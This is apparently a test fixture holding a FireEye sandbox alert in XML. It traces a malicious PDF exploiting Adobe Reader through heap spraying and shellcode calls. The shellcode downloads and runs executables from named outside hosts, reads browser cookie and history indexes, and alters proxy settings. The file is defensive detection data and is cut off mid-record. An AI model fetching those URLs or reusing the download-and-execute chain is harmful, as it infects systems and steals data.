@@ -1,0 +1,1151 @@
+<?xml version="1.0" encoding="utf-8"?>
+<alerts appliance="10.3.79.36" msg="extended" product="Email MPS" version="6.1.0.70175" xmlns="http://www.fireeye.com/alert/2011/AlertSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.fireeye.com/alert/2011/AlertSchema FireEyeAlert.xsd">
+  <alert id="65807620" name="malware-object" severity="majr">
+    <explanation analysis="none" protocol="0">
+      <malware-detected>
+        <malware name="Malicious.URL" sid="83502602" stype="fqc" type="pdf">
+          <downloaded-at>2012-10-23T21:28:39.404617</downloaded-at>
+          <md5sum>7dba915a29751e06562789fce763f0ea</md5sum>
+          <original>13842.pdf</original>
+          <executed-at>2012-10-23T21:33:47.995391</executed-at>
+          <application>Adobe Reader 9.0</application>
+        </malware>
+      </malware-detected>
+      <cnc-services>
+        <cnc-service port="80" protocol="tcp">
+          <address>www.ineedstorage.com</address>
+          <channel>GET /images/1023.exe HTTP/1.1::~~Accept: */*::~~UA-CPU: x86::~~Accept-Encoding: gzip, deflate::~~User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)::~~Host: www.ineedstorage.com::~~Connection: Keep-Alive::~~::~~</channel>
+        </cnc-service>
+        <cnc-service port="80" protocol="tcp">
+          <address>avotgid.info</address>
+          <channel>GET /1.bin HTTP/1.1::~~Accept: */*::~~UA-CPU: x86::~~Accept-Encoding: gzip, deflate::~~User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)::~~Host: avotgid.info::~~Connection: Keep-Alive::~~::~~</channel>
+        </cnc-service>
+        <cnc-service port="80" protocol="tcp">
+          <address>199.16.199.2</address>
+          <channel>GET /images/1023.exe HTTP/1.1::~~Accept: */*::~~UA-CPU: x86::~~Accept-Encoding: gzip, deflate::~~User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)::~~Host: www.ineedstorage.com::~~Connection: Keep-Alive::~~::~~</channel>
+        </cnc-service>
+      </cnc-services>
+      <os-changes id="325515" osinfo="Microsoft WindowsXP Professional 5.1 sp2" version="4.812">
+        <analysis ftype="pdf" mode="malware" version="4.812" />
+        <os name="windows" sp="2" version="5.1.2600" />
+        <os_monitor build="69105" date="Jan 24 2012" time="14:44:55" />
+        <uac mode="privilege use">SeTcbPrivilege</uac>
+        <uac mode="service">
+          <value>Telephony</value>
+          <status>running</status>
+        </uac>
+        <uac mode="privilege use">SeTcbPrivilege</uac>
+        <uac mode="service">
+          <value>Remote Access Connection Manager</value>
+          <status>running</status>
+        </uac>
+        <heapspraying name="acrord32.exe" type="Allocation">
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <bytesreceived>0</bytesreceived>
+          <totalmemory>172322816</totalmemory>
+          <lastbytesreceived>0</lastbytesreceived>
+          <lasttotalmemory>151322624</lasttotalmemory>
+          <incrementCount>8</incrementCount>
+        </heapspraying>
+        <malicious-alert classtype="misc-anomaly">
+          <msg>Malicious heap spray allocation detected</msg>
+          <display-msg>Malware allocating memory for malicious heap spray</display-msg>
+        </malicious-alert>
+        <exploitcode>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>GetTempPathA</apiname>
+          <address>0x02fd00ba</address>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x7c8221d4</instruction-address>
+              <module-name>C:\WINDOWS\system32\kernel32.dll</module-name>
+              <symbol-name>GetTempPathA</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x02fd00ba</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x00949568</instruction-address>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <malicious-alert classtype="misc-anomaly">
+          <display-msg>Exploit capabilities detected</display-msg>
+        </malicious-alert>
+        <exploitcode>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>GetProcAddress</apiname>
+          <address>0x02fd00e4</address>
+          <params>
+            <param id="1">0x7c800000</param>
+            <param id="2">ExitThread</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x7c80ac2d</instruction-address>
+              <module-name>C:\WINDOWS\system32\kernel32.dll</module-name>
+              <symbol-name>GetProcAddress</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x02fd00e4</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x00949568</instruction-address>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <exploitcode>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>LoadLibraryA</apiname>
+          <address>0x02fd0101</address>
+          <params>
+            <param id="1">urlmon.dll</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x7c801d7c</instruction-address>
+              <module-name>C:\WINDOWS\system32\kernel32.dll</module-name>
+              <symbol-name>LoadLibraryA</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x02fd0101</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x00949568</instruction-address>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <exploitcode>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>urlmon</dllname>
+          <apiname>URLDownloadToFileA</apiname>
+          <address>0x02fd011b</address>
+          <params>
+            <param id="1">0x00000000</param>
+            <param id="2">http://www.ineedstorage.com/images/1023.exe</param>
+            <param id="3">C:\DOCUME~1\admin\LOCALS~1\Temp\d.1xd</param>
+            <param id="4">0</param>
+            <param id="5">0x00000000</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x61495b0a</instruction-address>
+              <module-name>C:\WINDOWS\system32\urlmon.dll</module-name>
+              <symbol-name>URLDownloadToFileA</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x00949568</instruction-address>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <regkey mode="added">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\DownloadManager</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <file mode="open">
+          <value>C:\Documents and Settings\admin\Local Settings\Temporary Internet Files\Content.IE5\index.dat</value>
+          <fid ads="">281474976720123</fid>
+          <filesize>65536</filesize>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </file>
+        <folder mode="open">
+          <value>C:\Documents and Settings\admin\Cookies</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </folder>
+        <file mode="open">
+          <value>C:\Documents and Settings\admin\Cookies\index.dat</value>
+          <fid ads="">281474976720132</fid>
+          <filesize>32768</filesize>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </file>
+        <malicious-alert classtype="data-theft">
+          <msg>Malware reading IE cookie index</msg>
+          <display-msg>Internet Explorer cookie index read</display-msg>
+        </malicious-alert>
+        <file mode="open">
+          <value>C:\Documents and Settings\admin\Local Settings\History\History.IE5\index.dat</value>
+          <fid ads="">281474976720127</fid>
+          <filesize>32768</filesize>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </file>
+        <malicious-alert classtype="data-theft">
+          <msg>Malware reading IE history index</msg>
+          <display-msg>Internet Explorer history index read</display-msg>
+        </malicious-alert>
+        <mutex>
+          <value />
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </mutex>
+        <network mode="connected">
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <protocol_type>udp</protocol_type>
+          <destination_port>1039</destination_port>
+          <ipaddress>127.0.0.1</ipaddress>
+        </network>
+        <malicious-alert classtype="misc-anomaly">
+          <msg>Malware attempting connections to loopback interface</msg>
+          <display-msg>Loopback communication attempted</display-msg>
+        </malicious-alert>
+        <mutex>
+          <value />
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </mutex>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-1409082233-688789844-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\"MigrateProxy" = 0x00000001</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-1409082233-688789844-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\"ProxyEnable" = 0x00000000</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <malicious-alert classtype="misc-anomaly">
+          <msg>Malware modifying browser proxy settings</msg>
+          <display-msg>Browser settings tampered</display-msg>
+        </malicious-alert>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SYSTEM\ControlSet001\Hardware Profiles\0001\Software\Microsoft\windows\CurrentVersion\Internet Settings\"ProxyEnable" = 0x00000000</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-1409082233-688789844-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\"SavedLegacySettings" = 46 00 00 00 0b 00 00 00 01 00 00 00 0d 00 00 00 31 30 2e 30 2e 30 2e 32 3a 38 30 38 30 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 c0 7e dd d3 73 dc cc 01 01 00 00 00 0a 00 02 0f 00 00 00 00 00 00 00 00 00 00 00 00</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <malicious-alert classtype="misc-anomaly">
+          <msg>Browser network configuration modified</msg>
+          <display-msg>Network settings tampered</display-msg>
+        </malicious-alert>
+        <mutex>
+          <value>\BaseNamedObjects\ZoneAttributeCacheCounterMutex</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </mutex>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-1409082233-688789844-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"ProxyBypass" = 0x00000001</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-1409082233-688789844-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"IntranetName" = 0x00000001</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-1409082233-688789844-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"UNCAsIntranet" = 0x00000001</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-1409082233-688789844-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"AutoDetect" = 0x00000001</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <mutex>
+          <value>\BaseNamedObjects\ZoneAttributeCacheCounterMutex</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </mutex>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-1409082233-688789844-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"ProxyBypass" = 0x00000001</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-1409082233-688789844-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"IntranetName" = 0x00000001</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-1409082233-688789844-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"UNCAsIntranet" = 0x00000001</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-1409082233-688789844-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"AutoDetect" = 0x00000001</value>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <HardwareAccessDetection>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <function>NIC Probe</function>
+          <device>Network Card</device>
+          <handle>00000000</handle>
+          <size>0</size>
+          <address>0x0000000000000000</address>
+        </HardwareAccessDetection>
+        <network mode="dns_query">
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <protocol_type>udp</protocol_type>
+          <qtype>Host Address</qtype>
+          <hostname>www.ineedstorage.com</hostname>
+        </network>
+        <network mode="dns_query_answer">
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <winsock_res>0</winsock_res>
+          <dns_response_code>0</dns_response_code>
+          <hostname>www.ineedstorage.com</hostname>
+          <ipaddress>199.16.199.2</ipaddress>
+        </network>
+        <processstats>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <bytesreceived>0</bytesreceived>
+          <totalmemory>515809280</totalmemory>
+          <id>25</id>
+          <deltatime>1219</deltatime>
+        </processstats>
+        <network mode="connect">
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <protocol_type>tcp</protocol_type>
+          <destination_port>80</destination_port>
+          <ipaddress>199.16.199.2</ipaddress>
+        </network>
+        <malicious-alert classtype="misc-anomaly">
+          <msg>Malware attempting connections via standard ports</msg>
+          <display-msg>Network outbound communication attempted</display-msg>
+        </malicious-alert>
+        <exploitcode>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>WinExec</apiname>
+          <address>0x02fd01f6</address>
+          <params>
+            <param id="1">C:\DOCUME~1\admin\LOCALS~1\Temp\d.1xd</param>
+            <param id="2">0x0f601ffa</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x7c861152</instruction-address>
+              <module-name>C:\WINDOWS\system32\kernel32.dll</module-name>
+              <symbol-name>WinExec</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x02fd01f6</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x00949568</instruction-address>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <exploitcode>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>urlmon</dllname>
+          <apiname>URLDownloadToFileA</apiname>
+          <address>0x02fd011b</address>
+          <params>
+            <param id="1">0x00000000</param>
+            <param id="2">http://avotgid.info/1.bin</param>
+            <param id="3">C:\DOCUME~1\admin\LOCALS~1\Temp\b.e1b</param>
+            <param id="4">0</param>
+            <param id="5">0x00000000</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x61495b0a</instruction-address>
+              <module-name>C:\WINDOWS\system32\urlmon.dll</module-name>
+              <symbol-name>URLDownloadToFileA</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x00949568</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x02fd0000</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>4</frame-number>
+              <instruction-address>0x0f602050</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>5</frame-number>
+              <instruction-address>0x0f60204c</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>6</frame-number>
+              <instruction-address>0x0f602064</instruction-address>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <network mode="dns_query">
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <protocol_type>udp</protocol_type>
+          <qtype>Host Address</qtype>
+          <hostname>avotgid.info</hostname>
+        </network>
+        <network mode="dns_query_answer">
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <winsock_res>0</winsock_res>
+          <dns_response_code>0</dns_response_code>
+          <hostname>avotgid.info</hostname>
+          <ipaddress>199.16.199.3</ipaddress>
+        </network>
+        <network mode="connect">
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <protocol_type>tcp</protocol_type>
+          <destination_port>80</destination_port>
+          <ipaddress>199.16.199.3</ipaddress>
+        </network>
+        <exploitcode>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>CreateFileA</apiname>
+          <address>0x02fd0161</address>
+          <params>
+            <param id="1">C:\DOCUME~1\admin\LOCALS~1\Temp\b.e1b</param>
+            <param id="2">0xc0000000</param>
+            <param id="3">0x00000003</param>
+            <param id="4">0x00000000</param>
+            <param id="5">0x00000003</param>
+            <param id="6">0x00000080</param>
+            <param id="7">0x00000000</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x7c801a29</instruction-address>
+              <module-name>C:\WINDOWS\system32\kernel32.dll</module-name>
+              <symbol-name>CreateFileA</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x7c90dc55</instruction-address>
+              <module-name>C:\WINDOWS\system32\ntdll.dll</module-name>
+              <symbol-name>ZwMapViewOfSection</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x00949568</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>4</frame-number>
+              <instruction-address>0x4a803918</instruction-address>
+              <module-name>c:\Program Files\Adobe\Reader 8.0\Reader\icucnv34.dll</module-name>
+              <symbol-name>utrie_getData_3_4</symbol-name>
+              <symbol-displacement>0x00000084</symbol-displacement>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <exploitcode>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>VirtualAlloc</apiname>
+          <address>0x02fd017a</address>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x7c809a86</instruction-address>
+              <module-name>C:\WINDOWS\system32\kernel32.dll</module-name>
+              <symbol-name>VirtualAlloc</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0xffffffff</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x00949568</instruction-address>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <exploitcode>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>ReadFile</apiname>
+          <address>0x02fd0195</address>
+          <params>
+            <param id="1">0xffffffff</param>
+            <param id="2">0x12c50000</param>
+            <param id="3">524288</param>
+            <param id="4">0x0f601fc0</param>
+            <param id="5">0x00000000</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x7c801813</instruction-address>
+              <module-name>C:\WINDOWS\system32\kernel32.dll</module-name>
+              <symbol-name>ReadFile</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x02fd0195</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x00949568</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>4</frame-number>
+              <instruction-address>0x4a803918</instruction-address>
+              <module-name>c:\Program Files\Adobe\Reader 8.0\Reader\icucnv34.dll</module-name>
+              <symbol-name>utrie_getData_3_4</symbol-name>
+              <symbol-displacement>0x00000084</symbol-displacement>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <exploitcode>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>WriteFile</apiname>
+          <address>0x02fd01da</address>
+          <params>
+            <param id="1">0xffffffff</param>
+            <param id="2">0x12c50004</param>
+            <param id="3">0</param>
+            <param id="4">0x0f601fc0</param>
+            <param id="5">0x00000000</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x7c810fa4</instruction-address>
+              <module-name>C:\WINDOWS\system32\kernel32.dll</module-name>
+              <symbol-name>WriteFile</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x02fd01da</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x00949568</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>4</frame-number>
+              <instruction-address>0x4a803918</instruction-address>
+              <module-name>c:\Program Files\Adobe\Reader 8.0\Reader\icucnv34.dll</module-name>
+              <symbol-name>utrie_getData_3_4</symbol-name>
+              <symbol-displacement>0x00000084</symbol-displacement>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <exploitcode>
+          <processinfo>
+            <pid>420</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 8.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>WinExec</apiname>
+          <address>0x02fd01f6</address>
+          <params>
+            <param id="1">C:\DOCUME~1\admin\LOCALS~1\Temp\b.e1b</param>
+            <param id="2">0x0f601fd4</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x7c861152</instruction-address>
+              <module-name>C:\WINDOWS\system32\kernel32.dll</module-name>
+              <symbol-name>WinExec</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x02fd01f6</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x00949568</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>4</frame-number>
+              <instruction-address>0x4a803918</instruction-address>
+              <module-name>c:\Program Files\Adobe\Reader 8.0\Reader\icucnv34.dll</module-name>
+              <symbol-name>utrie_getData_3_4</symbol-name>
+              <symbol-displacement>0x00000084</symbol-displacement>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <end-of-report />
+      </os-changes>
+      <os-changes id="325516" osinfo="Microsoft Windows7 Professional 6.1 base" version="4.812">
+        <analysis ftype="pdf" mode="malware" version="4.812" />
+        <os name="windows" sp="0" version="6.1.7600" />
+        <os_monitor build="69105" date="Jan 24 2012" time="14:44:55" />
+        <uac mode="privilege use">SeTcbPrivilege</uac>
+        <heapspraying name="acrord32.exe" type="Allocation">
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <bytesreceived>0</bytesreceived>
+          <totalmemory>174784512</totalmemory>
+          <lastbytesreceived>0</lastbytesreceived>
+          <lasttotalmemory>153796608</lasttotalmemory>
+          <incrementCount>7</incrementCount>
+        </heapspraying>
+        <malicious-alert classtype="misc-anomaly">
+          <msg>Malicious heap spray allocation detected</msg>
+          <display-msg>Malware allocating memory for malicious heap spray</display-msg>
+        </malicious-alert>
+        <exploitcode>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>GetTempPathA</apiname>
+          <address>0x01f800ba</address>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x76ab899b</instruction-address>
+              <module-name>C:\Windows\system32\kernel32.dll</module-name>
+              <symbol-name>GetTempPathA</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x01f800ba</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x77d9507c</instruction-address>
+              <module-name>C:\Windows\SYSTEM32\ntdll.dll</module-name>
+              <symbol-name>NtMapViewOfSection</symbol-name>
+              <symbol-displacement>0x0000000c</symbol-displacement>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>4</frame-number>
+              <instruction-address>0x01139568</instruction-address>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <malicious-alert classtype="misc-anomaly">
+          <display-msg>Exploit capabilities detected</display-msg>
+        </malicious-alert>
+        <exploitcode>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>GetProcAddress</apiname>
+          <address>0x01f800e4</address>
+          <params>
+            <param id="1">0x76a50000</param>
+            <param id="2">ExitThread</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x76aa183c</instruction-address>
+              <module-name>C:\Windows\system32\kernel32.dll</module-name>
